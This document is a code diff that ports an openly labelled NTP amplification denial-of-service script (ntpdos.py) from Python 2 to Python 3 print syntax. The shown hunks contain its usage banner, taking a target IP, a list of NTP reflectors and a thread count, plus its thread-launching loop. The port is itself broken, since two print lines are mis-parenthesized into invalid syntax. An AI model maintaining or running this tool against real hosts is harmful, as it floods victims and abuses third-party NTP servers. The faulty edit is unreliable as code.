@@ -24,12 +24,12 @@ def deny():
 
 #So I dont have to have the same stuff twice
 def printhelp():
-    print "NTP Amplification DOS Attack"
-    print "By DaRkReD"
-    print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
-    print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
-    print "NTP serverlist file should contain one IP per line"
-    print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
+    print ("NTP Amplification DOS Attack")
+    print ("By DaRkReD")
+    print ("Usage ntpdos.py <target ip> <ntpserver list> <number of threads>")
+    print ("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
+    print "(NTP serverlist file should contain one IP per line")
+    (print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
     exit(0)
 
 try:
@@ -52,8 +52,8 @@ try:
 
     #Make sure we dont out of bounds
     if  numberthreads > int(len(ntplist)):
-        print "Attack Aborted: More threads than servers"
-        print "Next time dont create more threads than servers"
+        print ("Attack Aborted: More threads than servers")
+        print ("Next time dont create more threads than servers")
         exit(0)
 
     #Magic Packet aka NTP v2 Monlist Packet
@@ -73,7 +73,7 @@ try:
         threads.append(thread)
 
     #In progress!
-    print "Sending..."
+    print ("Sending...")
 
     #Keep alive so ctrl+c still kills all them threads
     while True:
